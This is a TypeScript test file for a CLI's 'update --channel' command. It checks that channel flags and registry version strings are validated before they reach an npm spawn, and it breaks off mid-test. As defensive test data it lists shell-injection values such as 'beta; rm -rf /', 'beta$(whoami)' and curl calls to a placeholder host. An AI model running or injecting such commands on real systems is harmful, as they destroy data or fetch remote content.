import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import type * as LocalOps from '@akasecurity/local-ops';
import type {
  CliUpdateTarget,
  DistTags,
  ReleaseChannel,
  ReleaseTagSource,
  UpdateReport,
} from '@akasecurity/schema';
import { DIST_TAG, RELEASE_CHANNEL, RELEASE_TAG_SOURCE } from '@akasecurity/schema';
import { beforeEach, describe, expect, it, vi } from 'vitest';

// `aka update --channel` is the first argv-sourced token on this path that
// could reach a child process's argv. `local-ops`' shelled spawn carries the
// homedir anchor but no quoting and no refusal — on Windows it routes through
// cmd.exe and Node concatenates argv unescaped — so the closed-union parse is
// the only thing between a typed string and that spawn.
//
// Which makes the NO-SPAWN half the assertion that matters here, not the exit
// code: a build that passed the raw value through would still exit non-zero
// once npm rejected the spec, and would have reached the registry with the
// token first.
//
// Both spawning seams are recorded rather than one. `gatherReportLive` is the
// registry read and `applyCliUpdate` is the install, and a refusal must reach
// neither: the PATH shims in this repo fail OPEN, so an unstubbed run here
// would resolve the developer's own `npm`.
interface RecordedSeams {
  reports: number;
  // The channel each report was asked to resolve the CLI row against. Recorded
  // because `updateAvailable` is what decides whether anything is applied at
  // all: a report resolved against the channel this copy is LEAVING has no row
  // to act on, so the flag would answer with "everything is up to date" and
  // switch nothing.
  reportChannels: (ReleaseChannel | undefined)[];
  // The whole TARGET at each of the two seams, not just its channel: the
  // version is what the install builds its npm spec from, so a channel threaded
  // correctly beside a dropped version is the defect this file exists to catch.
  planned: (CliUpdateTarget | undefined)[];
  applied: (CliUpdateTarget | undefined)[];
  // Every npm spec the REAL plan builder produced for a recorded target, which
  // is the string a spawn would have received.
  specs: string[];
  report: UpdateReport;
  // What THIS copy of the CLI reports as its own version, which is the only
  // input to the channel a flagless run follows.
  cliVersion: string | null;
}

const seams = vi.hoisted((): RecordedSeams => ({
  reports: 0,
  reportChannels: [],
  planned: [],
  applied: [],
  specs: [],
  report: { statuses: [], availablePlugins: [] },
  cliVersion: null,
}));

vi.mock('@akasecurity/local-ops', async (importActual) => {
  const actual = await importActual<typeof LocalOps>();
  return {
    ...actual,
    gatherReportLive: (cliChannel?: ReleaseChannel): UpdateReport => {
      seams.reports += 1;
      seams.reportChannels.push(cliChannel);
      return seams.report;
    },
    cliVersion: (): string | null => seams.cliVersion,
    // No install is organization-managed in this suite. Read live, the lookup
    // would answer from the developer's own Claude Code ledger, and a machine
    // enrolled with a managed drop-in would turn the plugin-target refusal
    // below into the managed one. update-managed.test.ts owns that case.
    managedPluginInstall: (): null => null,
    // A synthetic npm-global install, so the REAL planCliUpdate below produces
    // a runnable plan. This checkout classifies as a source tree, whose plan is
    // advice rather than a command — which would refuse before the apply and
    // leave the channel threading untested on every assertion here.
    detectInstallChannel: (): LocalOps.InstallChannel => ({
      kind: 'global',
      manager: 'npm',
      root: '/opt/node',
      packageDir: '/opt/node/lib/node_modules/@akasecurity/cli',
    }),
    planCliUpdate: (
      channel: LocalOps.InstallChannel,
      platform?: NodeJS.Platform,
      target?: CliUpdateTarget,
    ): LocalOps.UpdatePlan => {
      seams.planned.push(target);
      return actual.planCliUpdate(channel, platform, target);
    },
    applyCliUpdate: (
      channel: LocalOps.InstallChannel,
      _mode?: 'inherit' | 'capture',
      _hasBin?: (bin: string) => boolean,
      target?: CliUpdateTarget,
    ): LocalOps.ApplyResult => {
      seams.applied.push(target);
      // The spec the install would really have run, built by the REAL plan
      // builder from the target this seam was handed. Recorded here rather than
      // recomputed in a case, so no assertion can spell a spec of its own.
      const spec = actual.planCliUpdate(channel, 'linux', target).command?.args.at(-1);
      if (spec !== undefined) seams.specs.push(spec);
      return { ok: true, output: '' };
    },
  };
});

const {
  CLI_PACKAGE,
  createCliPluginManager,
  findAgent,
  gatherReport,
  isNewer,
  planCliUpdate,
  pluginRef,
  SWITCHABLE_CHANNELS,
} = await import('@akasecurity/local-ops');
const { runUpdate } = await import('../../src/commands/update.ts');
const { COMMAND_SPECS } = await import('../../src/command-manifest.ts');

// The plugin the refusal case drives, taken from the registry rather than
// described here — a literal ref or recipe would be a second copy of the thing
// under test and could agree with nothing.
const agent = findAgent('claude-code');
if (agent === undefined) throw new Error('the registry no longer carries a claude-code agent');

/** A CLI row that is behind, so the apply path is reachable. */
function cliRow(
  channel: ReleaseChannel,
  installed: string,
  latest: string,
  latestFrom: ReleaseTagSource = RELEASE_TAG_SOURCE.Channel,
): UpdateReport {
  return {
    statuses: [
      {
        id: 'cli',
        name: 'aka CLI',
        kind: 'cli',
        installed,
        latest,
        updateAvailable: true,
        channel,
        latestFrom,
      },
    ],
    availablePlugins: [],
  };
}

let home: string;

beforeEach(() => {
  seams.reports = 0;
  seams.reportChannels = [];
  seams.planned = [];
  seams.applied = [];
  seams.specs = [];
  seams.report = { statuses: [], availablePlugins: [] };
  seams.cliVersion = null;
  home = mkdtempSync(join(tmpdir(), 'aka-update-channel-'));
  process.exitCode = undefined;
});

async function run(argv: string[]): Promise<{ out: string; err: string; code: number }> {
  let out = '';
  let err = '';
  const outSpy = vi
    .spyOn(process.stdout, 'write')
    .mockImplementation((chunk: string | Uint8Array): boolean => {
      out += typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString('utf8');
      return true;
    });
  const errSpy = vi
    .spyOn(process.stderr, 'write')
    .mockImplementation((chunk: string | Uint8Array): boolean => {
      err += typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString('utf8');
      return true;
    });
  try {
    await runUpdate([...argv, '--home', home]);
  } finally {
    outSpy.mockRestore();
    errSpy.mockRestore();
  }
  const code = Number(process.exitCode ?? 0);
  process.exitCode = undefined;
  return { out, err, code };
}

describe('aka update --channel — a value that is not a channel', () => {
  // Every one of these is a token a shell would act on if it reached a command
  // line unescaped. The parse is what stops them, so the assertion is that
  // NOTHING ran — not merely that the command failed.
  const hostile = [
    'bogus',
    'latest',
    '',
    'beta; rm -rf /',
    'beta && curl http://example.test/x',
    'beta | tee /tmp/aka-pwn',
    'beta`whoami`',
    'beta$(whoami)',
    'beta%PATH%',
    'beta"quoted"',
    // Written in the `=` form because a dash-leading value is ambiguous to
    // `parseArgs` itself and never reaches the guard under test.
    '--prefix=/tmp',
    '__proto__',
  ];

  it.each(hostile)('refuses %j and spawns nothing at all', async (raw) => {
    const { err, code } = await run(['--yes', `--channel=${raw}`]);

    expect(code).toBe(1);
    // Neither the registry read nor the install was reached, which is the
    // property: the refusal happens before either.
    expect(seams.reports).toBe(0);
    expect(seams.applied).toHaveLength(0);
    expect(seams.planned).toHaveLength(0);
    // The refusal says what IS accepted — asserted as a non-empty message
    // naming each value, because an empty stderr satisfies every absence
    // assertion below it.
    expect(err).not.toBe('');
    for (const channel of Object.values(RELEASE_CHANNEL)) {
      expect(err).toContain(channel);
    }
  });

  it('does not echo the rejected token back', async () => {
    // Nothing on this path is from this repo except the accepted set, so the
    // one string that is not gets named nowhere.
    const raw = 'beta; curl http://example.test/aka-pwn';
    const { err, out } = await run(['--yes', `--channel=${raw}`]);

    expect(err).not.toBe('');
    expect(err).not.toContain('curl');
    expect(err).not.toContain('example.test');
    expect(out).toBe('');
  });
});

describe('aka update --channel — a value that is a channel', () => {
  it.each(Object.values(RELEASE_CHANNEL))(
    'reaches the plan and the apply with %s',
    async (channel) => {
      seams.report = cliRow(RELEASE_CHANNEL.Stable, '0.9.11', '0.9.12');
      const { code } = await run(['--yes', '--channel', channel]);

      expect(code).toBe(0);
      expect(seams.reports).toBe(1);
      // All three, and the same value in each. The REPORT decides whether there
      // is anything to apply, the plan is what gets PRINTED and the apply is
      // what RUNS — a channel threaded into some of them and defaulted in the
      // rest reports one version, prints a second and installs a third.
      expect(seams.reportChannels).toStrictEqual([channel]);
      expect(seams.planned.map((t) => t?.channel)).toContain(channel);
      expect(seams.applied).toStrictEqual([{ channel, version: '0.9.12' }]);
    },
  );

  it('resolves the report against the asked-for channel, not the one being left', async () => {
    // The defect this pins is silent and total: resolve the row against the
    // channel this copy is ALREADY on and a machine that is current there has
    // no `updateAvailable` row, so `outdated()` is empty, nothing is applied,
    // and the command reports success having switched nothing.
    seams.cliVersion = '0.9.12';
    seams.report = { statuses: [], availablePlugins: [] };
    const { code } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`]);

    expect(code).toBe(0);
    expect(seams.reportChannels).toStrictEqual([RELEASE_CHANNEL.Beta]);
    // And the derived channel is what a flagless run asks for, so the same
    // assertion cannot pass by the value simply always being `beta`.
    seams.reportChannels = [];
    await run(['--yes']);
    expect(seams.reportChannels).toStrictEqual([RELEASE_CHANNEL.Stable]);
  });

  it('says a switch found nothing rather than that the machine is current', async () => {
    // `aka update` only moves forward, so a channel whose newest release is
    // behind this copy has no step to take. "Everything is up to date" would
    // read as the switch having happened.
    seams.cliVersion = '0.11.0-beta.3';
    seams.report = {
      statuses: [
        {
          id: 'cli',
          name: 'aka CLI',
          kind: 'cli',
          installed: '0.11.0-beta.3',
          latest: '0.9.12',
          updateAvailable: false,
          channel: RELEASE_CHANNEL.Stable,
        },
      ],
      availablePlugins: [],
    };
    const asked = await run(['--yes', `--channel=${RELEASE_CHANNEL.Stable}`]);

    expect(asked.out).toContain(RELEASE_CHANNEL.Stable);
    expect(asked.out).not.toContain('Everything is up to date');
    expect(seams.applied).toHaveLength(0);

    // The control: with no flag the sentence is the one that shipped, so the
    // absence above is about the request rather than about this report.
    seams.applied = [];
    const bare = await run(['--yes']);
    expect(bare.out).toContain('Everything is up to date');
  });

  it.each([
    ['0.11.0-beta.2', RELEASE_CHANNEL.Beta],
    ['0.9.13-nightly.20260918.gabc1234', RELEASE_CHANNEL.Nightly],
    ['0.9.11', RELEASE_CHANNEL.Stable],
    [null, RELEASE_CHANNEL.Stable],
  ] satisfies [string | null, ReleaseChannel][])(
    'follows the channel %s is on when the flag is absent',
    async (installed, expected) => {
      // A bare run must not move a machine's channel in EITHER direction, so
      // the value threaded is derived from this copy's own version rather than
      // defaulted. The prerelease rows are what make that a live assertion: a
      // default of stable would silently move a beta machine back.
      seams.cliVersion = installed;
      seams.report = cliRow(RELEASE_CHANNEL.Stable, '0.9.11', '0.9.12');
      const { code } = await run(['--yes']);

      expect(code).toBe(0);
      expect(seams.applied).toStrictEqual([{ channel: expected, version: '0.9.12' }]);
      // The report is resolved against that same derived channel, so a bare run
      // reads the line it is on rather than the stable one.
      expect(seams.reportChannels).toStrictEqual([expected]);
    },
  );

  it('names a non-stable channel in the preamble, and stays quiet on stable', async () => {
    // The BULLET line specifically, not the whole output: the report table
    // renders a channel column of its own, so an assertion over stdout would
    // pass on that and say nothing about the preamble.
    const bulletOf = (out: string): string =>
      out.split('\n').find((line) => line.trimStart().startsWith('•')) ?? '';

    seams.report = cliRow(RELEASE_CHANNEL.Beta, '0.11.0-beta.2', '0.11.0-beta.3');
    const beta = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`]);
    expect(beta.out).toContain('Will update:');
    expect(bulletOf(beta.out)).not.toBe('');
    expect(bulletOf(beta.out)).toContain('0.11.0-beta.3');
    expect(bulletOf(beta.out)).toContain(RELEASE_CHANNEL.Beta);

    seams.report = cliRow(RELEASE_CHANNEL.Stable, '0.9.11', '0.9.12');
    const stable = await run(['--yes', `--channel=${RELEASE_CHANNEL.Stable}`]);
    expect(stable.out).toContain('Will update:');
    // The positive control above is what keeps this absence honest: the bullet
    // is rendered in both runs, and only one of them names a channel.
    expect(bulletOf(stable.out)).toContain('0.9.12');
    expect(bulletOf(stable.out)).not.toContain(RELEASE_CHANNEL.Stable);
  });
});

describe('aka update --channel — what the manifest promises', () => {
  // The manifest is what the shell-completion scripts are generated from, so a
  // flag the parser accepts and the manifest omits is one nothing offers and
  // nothing documents. `completion.test.ts` derives its expectations from this
  // same table, which makes it a CONSISTENCY check: drop the entry and both
  // sides move together and stay green. Presence is pinned here instead.
  it('lists the flag on the update command', () => {
    const update = COMMAND_SPECS.find((spec) => spec.name === 'update');
    expect(update).toBeDefined();
    expect((update?.flags ?? []).map((flag) => flag.name)).toContain('--channel');
  });

  it('names every channel the parser accepts, and nothing it refuses', () => {
    const channel = (COMMAND_SPECS.find((spec) => spec.name === 'update')?.flags ?? []).find(
      (flag) => flag.name === '--channel',
    );
    expect(channel).toBeDefined();
    const summary = String(channel?.summary);

    // Derived, so a member added to the vocabulary reddens the documentation
    // rather than being silently undocumented — and the non-empty guard is what
    // stops the loop holding vacuously.
    expect(SWITCHABLE_CHANNELS.length).toBeGreaterThan(0);
    for (const value of SWITCHABLE_CHANNELS) {
      expect(summary, value).toContain(value);
    }
    // And the tag names are the registry's, not a user's: documenting `latest`
    // would advertise a value `parseSwitchableChannel` refuses.
    expect(summary).not.toContain('latest');
  });
});

describe('aka update --channel — a plugin target', () => {
  it('refuses rather than ignoring the flag, and applies nothing', async () => {
    // A plugin's channel is its marketplace registration, which only the host
    // CLI can change. Accepting and ignoring the flag would report a switch
    // that never happened.
    const { err, code } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`, 'claude-code']);

    expect(code).toBe(1);
    expect(seams.reports).toBe(0);
    expect(seams.applied).toHaveLength(0);
    expect(err).not.toBe('');
    expect(err).toContain(agent.name);

    // And it names the line to run instead, DERIVED from the host's own verb
    // table rather than written here: the marketplace registration is the
    // thing that decides a plugin's channel, and the hosts share neither the
    // binary nor the verbs.
    const ref = pluginRef(agent);
    expect(ref).toBeDefined();
    expect(agent.cliBin).toBeDefined();
    const recipe = createCliPluginManager(agent.cliBin ?? 'claude').updateRecipe(
      String(ref),
      agent.marketplaceSource,
    );
    expect(recipe.length).toBeGreaterThan(0);
    expect(err).toContain(recipe.join(' && '));
  });

  it('accepts the flag for the cli target and for all', async () => {
    // The positive control for the refusal above: it must be scoped to a
    // PLUGIN target rather than to the presence of any target at all.
    for (const target of ['cli', 'all']) {
      seams.report = cliRow(RELEASE_CHANNEL.Stable, '0.9.11', '0.9.12');
      seams.applied = [];
      const { code } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`, target]);

      expect(code, target).toBe(0);
      expect(seams.applied, target).toStrictEqual([
        { channel: RELEASE_CHANNEL.Beta, version: '0.9.12' },
      ]);
    }
  });
});

/**
 * What `aka update` OFFERS and what it INSTALLS, over the real resolution.
 *
 * Every row below builds its report through the REAL `gatherReport` from a
 * registry tag map, so the row the command prints and the spec it runs are both
 * derived rather than written here. That is the whole property: a hand-built row
 * beside a hand-written spec agrees with nothing.
 */
describe('aka update — the offer and the install name one version', () => {
  interface Registry {
    installed: string | null;
    tags: DistTags | null;
    requested?: ReleaseChannel;
  }

  /** The report the real resolution produces for a registry state. */
  function reportFor({ installed, tags, requested }: Registry): UpdateReport {
    return gatherReport({
      viewDistTags: (pkg) => (pkg === CLI_PACKAGE ? tags : null),
      installed: new Map(),
      cliInstalled: installed,
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
      ...(requested === undefined ? {} : { cliChannel: requested }),
    });
  }

  async function drive(registry: Registry): Promise<{ out: string; err: string; code: number }> {
    seams.cliVersion = registry.installed;
    seams.report = reportFor(registry);
    return registry.requested === undefined
      ? run(['--yes'])
      : run(['--yes', `--channel=${registry.requested}`]);
  }

  const offering: [string, Registry, string][] = [
    [
      'a graduating beta machine installs the release, not its own tag',
      { installed: '0.11.0-beta.3', tags: { latest: '0.11.0', beta: '0.11.0-beta.3' } },
      '0.11.0',
    ],
    [
      'a beta machine moving to a newer beta installs that beta',
      { installed: '0.11.0-beta.3', tags: { latest: '0.9.12', beta: '0.11.0-beta.4' } },
      '0.11.0-beta.4',
    ],
    [
      'a stable machine installs the stable version, never the prerelease beside it',
      { installed: '0.9.11', tags: { latest: '0.9.12', beta: '0.11.0-beta.4' } },
      '0.9.12',
    ],
    [
      'an explicit --channel beta installs the beta tag while it leads',
      {
        installed: '0.9.11',
        tags: { latest: '0.9.12', beta: '0.11.0-beta.4' },
        requested: RELEASE_CHANNEL.Beta,
      },
      '0.11.0-beta.4',
    ],
    // No row here for an EXPLICIT --channel beta once stable has overtaken it:
    // that state is `Graduated`, and printing the stable version beside the
    // requested channel's name is exactly the false sentence the refusal in
    // "a channel the stable release has graduated past" below exists to
    // prevent. It is a REQUEST refused, not an offer — see that describe block.
  ];

  it.each(offering)('%s', async (_name, registry, expected) => {
    const { code, out } = await drive(registry);

    expect(code).toBe(0);
    // The spec the install really received, built by the real plan builder.
    expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@${expected}`]);
    // And the row the user just read names that same version — asserted through
    // the report rather than the literal, so the two cannot be right separately.
    const row = reportFor(registry).statuses.find((s) => s.id === 'cli');
    expect(row?.latest).toBe(expected);
    expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@${String(row?.latest)}`]);
    expect(out).toContain(expected);
    // The dist-tag spec is what shipped, and what a revert produces.
    expect(seams.specs[0]).not.toBe(
      `${CLI_PACKAGE}@${DIST_TAG[registry.requested ?? RELEASE_CHANNEL.Stable]}`,
    );
  });

  it('offers nothing once the installed version IS the graduated release', () => {
    // The other half of the graduation row: with the fix, one update closes the
    // loop. With the dist-tag spec it never did — the install put 0.11.0-beta.3
    // back, so the next run offered 0.11.0 again, for ever.
    const graduated = reportFor({
      installed: '0.11.0',
      tags: { latest: '0.11.0', beta: '0.11.0-beta.3' },
    });
    const row = graduated.statuses.find((s) => s.id === 'cli');
    expect(row?.latest).toBe('0.11.0');
    expect(row?.updateAvailable).toBe(false);
  });

  it('spawns nothing and says so when the registry could not be reached', async () => {
    const { code, out } = await drive({ installed: '0.9.11', tags: null });

    expect(code).toBe(0);
    expect(seams.applied).toHaveLength(0);
    expect(seams.specs).toHaveLength(0);
    expect(out).toContain('Could not reach the package registry');
  });

  it('is the same command on every path — one value, three readers', async () => {
    // The report resolves the row, the plan prints the line and the apply runs
    // the spec. A version threaded into some of them and defaulted in the rest
    // reports one version, prints a second and installs a third.
    await drive({ installed: '0.11.0-beta.3', tags: { latest: '0.11.0', beta: '0.11.0-beta.3' } });

    expect(seams.planned).toHaveLength(1);
    expect(seams.applied).toStrictEqual(seams.planned);
    expect(seams.applied).toStrictEqual([{ channel: RELEASE_CHANNEL.Beta, version: '0.11.0' }]);
  });
});

/**
 * An explicitly requested channel that serves no dist-tag.
 *
 * The report still carries a version there — the stable fallback, which is the
 * right OFFER for a machine whose own prerelease tag was retired. It is the
 * wrong answer for a REQUEST: the install would ask npm for a tag nothing
 * publishes, so the command has to refuse instead of printing a version off
 * another line as though it were this one.
 */
describe('aka update --channel — a channel nothing publishes', () => {
  function published(tags: DistTags, installed: string, requested: ReleaseChannel): UpdateReport {
    return gatherReport({
      viewDistTags: (pkg) => (pkg === CLI_PACKAGE ? tags : null),
      installed: new Map(),
      cliInstalled: installed,
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
      cliChannel: requested,
    });
  }

  it('refuses before the confirmation and before any install spawn', async () => {
    seams.cliVersion = '0.9.11';
    seams.report = published({ latest: '0.11.0' }, '0.9.11', RELEASE_CHANNEL.Nightly);
    const { err, out, code } = await run([`--channel=${RELEASE_CHANNEL.Nightly}`]);

    expect(code).toBe(1);
    // Nothing was planned and nothing was installed, which is the property —
    // not merely that the command failed, which it also did when npm rejected
    // the spec after the update had been announced and confirmed.
    expect(seams.planned).toHaveLength(0);
    expect(seams.applied).toHaveLength(0);
    expect(seams.specs).toHaveLength(0);
    // No `--yes` on that run, so a refusal that came AFTER the confirmation
    // would have stopped at the prompt instead. Nothing offered the update.
    expect(out).not.toContain('Will update:');
    expect(out).not.toContain('Apply these updates?');
    // Nor was the row rendered: the table would have said a version is
    // available on a line that has never had a release, which is the sentence
    // the user acts on.
    expect(out).not.toContain('update available');
    // The message names the channel and says nothing has been published there.
    expect(err).not.toBe('');
    expect(err).toContain(RELEASE_CHANNEL.Nightly);
    expect(err.toLowerCase()).toContain('nothing has been published');
    // And never the version it would otherwise have offered off another line.
    expect(err).not.toContain('0.11.0');
    expect(out).not.toContain('0.11.0');
  });

  it('refuses even where the fallback version would be an upgrade', async () => {
    // The row is `updateAvailable`, so this is not the "nothing to install"
    // branch answering for it: the refusal has to fire on the SOURCE.
    const report = published({ latest: '0.11.0' }, '0.9.11', RELEASE_CHANNEL.Nightly);
    const row = report.statuses.find((s) => s.id === 'cli');
    expect(row?.updateAvailable).toBe(true);
    expect(row?.latestFrom).toBe(RELEASE_TAG_SOURCE.Unpublished);

    seams.cliVersion = '0.9.11';
    seams.report = report;
    const { code } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Nightly}`]);

    expect(code).toBe(1);
    expect(seams.applied).toHaveLength(0);
  });

  it('keeps the fallback on the DERIVED path — a retired beta tag still updates', async () => {
    // The control that scopes the refusal to a REQUEST. A beta machine whose
    // tag has been withdrawn must still be offered the stable and must still
    // install it; refusing here would strand it with no way forward.
    seams.cliVersion = '0.11.0-beta.3';
    seams.report = gatherReport({
      viewDistTags: (pkg) => (pkg === CLI_PACKAGE ? { latest: '0.12.0' } : null),
      installed: new Map(),
      cliInstalled: '0.11.0-beta.3',
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
    });
    const { code, out } = await run(['--yes']);

    expect(code).toBe(0);
    expect(out).toContain('Will update:');
    expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@0.12.0`]);
  });

  it('refuses an explicitly requested channel whose tag is gone', async () => {
    // The same registry state as the control above, asked for BY NAME. The two
    // rows differ only in the flag, which is what makes the scoping the subject.
    seams.cliVersion = '0.11.0-beta.3';
    seams.report = published({ latest: '0.12.0' }, '0.11.0-beta.3', RELEASE_CHANNEL.Beta);
    const { code, err } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`]);

    expect(code).toBe(1);
    expect(err).toContain(RELEASE_CHANNEL.Beta);
    expect(seams.applied).toHaveLength(0);
  });
});

/**
 * An explicitly requested channel the stable release has GRADUATED past.
 *
 * `resolveChannel` answers such a request with the STABLE version — that is
 * the whole graduation mechanism, so a beta machine's own tag does not strand
 * it once stable has caught up. Rendering that answer beside the requested
 * channel's own name is the false sentence this refusal exists to prevent:
 * `aka update --channel beta` printing the stable release as `(beta)`, while
 * `beta` itself never published it and this machine never leaves stable.
 */
describe('aka update --channel — a channel the stable release has graduated past', () => {
  function graduated(tags: DistTags, installed: string, requested: ReleaseChannel): UpdateReport {
    return gatherReport({
      viewDistTags: (pkg) => (pkg === CLI_PACKAGE ? tags : null),
      installed: new Map(),
      cliInstalled: installed,
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
      cliChannel: requested,
    });
  }

  it('refuses before the confirmation and before any install spawn', async () => {
    seams.cliVersion = '0.9.11';
    seams.report = graduated(
      { latest: '0.12.0', beta: '0.11.0-beta.4' },
      '0.9.11',
      RELEASE_CHANNEL.Beta,
    );
    // The row this fixture produces really is the graduated shape — the
    // non-vacuity control for the assertions below.
    const row = graduated(
      { latest: '0.12.0', beta: '0.11.0-beta.4' },
      '0.9.11',
      RELEASE_CHANNEL.Beta,
    ).statuses.find((s) => s.id === 'cli');
    expect(row?.latestFrom).toBe(RELEASE_TAG_SOURCE.Graduated);
    expect(row?.latest).toBe('0.12.0');
    expect(row?.channelLatest).toBe('0.11.0-beta.4');

    const { err, out, code } = await run([`--channel=${RELEASE_CHANNEL.Beta}`]);

    expect(code).toBe(1);
    // Nothing was planned, rendered or installed — not merely that the
    // command failed, which it would also do if the row reached the install
    // and npm resolved the spec back to what was already there.
    expect(seams.planned).toHaveLength(0);
    expect(seams.applied).toHaveLength(0);
    expect(seams.specs).toHaveLength(0);
    // No `--yes` on that run, so a refusal that came AFTER the confirmation
    // would have stopped at the prompt instead.
    expect(out).not.toContain('Will update:');
    expect(out).not.toContain('Apply these updates?');
    expect(out).not.toContain('update available');
    // The message names the requested channel, the channel's own newest
    // release, the stable version that outranks it, and how to get the
    // stable instead.
    expect(err).not.toBe('');
    expect(err).toContain(RELEASE_CHANNEL.Beta);
    expect(err).toContain('0.11.0-beta.4');
    expect(err).toContain('0.12.0');
    expect(err.toLowerCase()).toContain('graduated');
    expect(err).toContain('aka update');
  });

  it('says so even with no channelLatest to name', async () => {
    // A row built by hand rather than through the real resolution — the field
    // is optional precisely because a caller may not have it, and the refusal
    // must still fire and still name the stable version.
    seams.cliVersion = '0.9.11';
    seams.report = {
      statuses: [
        {
          id: 'cli',
          name: 'aka CLI',
          kind: 'cli',
          installed: '0.9.11',
          latest: '0.12.0',
          updateAvailable: true,
          channel: RELEASE_CHANNEL.Beta,
          latestFrom: RELEASE_TAG_SOURCE.Graduated,
        },
      ],
      availablePlugins: [],
    };
    const { err, code } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`]);

    expect(code).toBe(1);
    expect(seams.applied).toHaveLength(0);
    expect(err).toContain(RELEASE_CHANNEL.Beta);
    expect(err).toContain('0.12.0');
  });

  it('keeps the DERIVED path graduating, with no --channel on the command line', async () => {
    // The control that scopes the refusal to a REQUEST: a beta machine with no
    // flag must still move onto the stable release exactly as before —
    // refusing here would strand it on its own tag forever.
    seams.cliVersion = '0.11.0-beta.3';
    seams.report = gatherReport({
      viewDistTags: (pkg) =>
        pkg === CLI_PACKAGE ? { latest: '0.11.0', beta: '0.11.0-beta.3' } : null,
      installed: new Map(),
      cliInstalled: '0.11.0-beta.3',
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
    });
    const { code, out } = await run(['--yes']);

    expect(code).toBe(0);
    expect(out).toContain('Will update:');
    expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@0.11.0`]);
  });

  it('still proceeds when the requested channel has a newer release of its own', async () => {
    // The positive control: an explicit --channel beta whose own tag LEADS
    // stable has not graduated, and must reach the plan and the apply exactly
    // as an unrefused request would.
    seams.cliVersion = '0.9.11';
    seams.report = graduated(
      { latest: '0.9.12', beta: '0.11.0-beta.4' },
      '0.9.11',
      RELEASE_CHANNEL.Beta,
    );
    const { code } = await run(['--yes', `--channel=${RELEASE_CHANNEL.Beta}`]);

    expect(code).toBe(0);
    expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@0.11.0-beta.4`]);
  });
});

/**
 * A resolved version is REGISTRY-SUPPLIED TEXT, and on Windows `local-ops`'
 * shelled spawn hands argv to cmd.exe, which Node concatenates without
 * escaping. So these drive hostile answers in through the seam a real `npm
 * view` reads (it checks only that each value is a string) and assert on the
 * SPAWN, which is the only place that matters.
 */
describe('aka update — a hostile registry answer never reaches argv', () => {
  // The rows the strict check is the ONLY thing standing in front of are the
  // whitespace-wrapped ones: the comparator trims, so those become candidates
  // and the apply is reached with them, where every other row here is refused
  // one step earlier by `isNewer` and spawns nothing whatever the check does.
  // Several placements are carried for that reason — with one such row this
  // whole describe reddens on a single case, and with none it reddens on no
  // case at all while still reading as eleven assertions about argv.
  const hostile = [
    '0.9.12; rm -rf /',
    '0.9.12 && curl http://example.test/x',
    '0.9.12 | tee /tmp/aka-pwn',
    '0.9.12`whoami`',
    '0.9.12$(whoami)',
    '0.9.12 --prefix=/tmp',
    '0.9.12\nlatest',
    ' 0.9.12 ',
    ' 0.9.12',
    '0.9.12 ',
    '\t0.9.12',
    '0.9.12\n',
    '0.9.12\r',
    '-0.9.12',
    '0.9.12%PATH%',
    '0.9.12"quoted"',
  ];

  const INSTALLED = '0.9.11';

  it.each(hostile)('never spawns %j, on any path', async (version) => {
    seams.cliVersion = INSTALLED;
    seams.report = gatherReport({
      viewDistTags: (pkg) => (pkg === CLI_PACKAGE ? { latest: version } : null),
      installed: new Map(),
      cliInstalled: INSTALLED,
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
    });
    await run(['--yes']);

    // Two outcomes are possible and each row asserts exactly ONE of them, so a
    // row cannot go quiet: a value the comparator can order becomes a candidate
    // and the spec must fall back to the tag, and a value it cannot order is
    // never offered and nothing may spawn at all. `isNewer` is what decides,
    // asked here rather than guessed per row, so a value that changes groups is
    // still asserted definitely instead of matching an empty list.
    if (isNewer(version, INSTALLED)) {
      expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@${DIST_TAG[RELEASE_CHANNEL.Stable]}`]);
    } else {
      expect(seams.specs).toStrictEqual([]);
      expect(seams.applied).toStrictEqual([]);
    }

    // And nothing that DID spawn carries the value, in any argv element. The
    // trim is what makes ` 0.9.12 ` a real assertion: untrimmed it is absent
    // from an argv that carries `0.9.12` for an unrelated reason.
    for (const target of seams.applied) {
      const args = planCliUpdate(
        { kind: 'global', manager: 'npm', root: '/opt/node', packageDir: '/opt/node/x' },
        'linux',
        target ?? { channel: RELEASE_CHANNEL.Stable, version: null },
      ).command?.args;
      expect(args?.length).toBeGreaterThan(0);
      for (const arg of args ?? []) expect(arg, arg).not.toContain(version.trim());
    }
  });

  it('has a row in each group, so neither branch above is unreachable', () => {
    // The partition is derived, so it is worth proving both halves are
    // populated: a list that drifted entirely into the unorderable group would
    // stop exercising the fallback while every row still passed.
    const orderable = hostile.filter((version) => isNewer(version, INSTALLED));
    expect(orderable.length).toBeGreaterThan(0);
    expect(orderable.length).toBeLessThan(hostile.length);

    // And the ORDERABLE half — the only half where the strict check decides
    // anything, since the rest never become candidates — has to carry both
    // placements. A group of trailing-whitespace rows alone is fully refused by
    // a one-sided `trimEnd` comparison, so the rows above would go on passing
    // against a check that admits a leading space into argv.
    const leadingOnly = orderable.filter(
      (version) => version !== version.trimStart() && version === version.trimEnd(),
    );
    const trailingOnly = orderable.filter(
      (version) => version === version.trimStart() && version !== version.trimEnd(),
    );
    expect(leadingOnly.length).toBeGreaterThan(0);
    expect(trailingOnly.length).toBeGreaterThan(0);
  });

  it('spawns the version when the registry answer is a real one', async () => {
    // The non-vacuity control: without it every row above passes on a command
    // that installs nothing at all, whatever the registry said.
    seams.cliVersion = '0.9.11';
    seams.report = gatherReport({
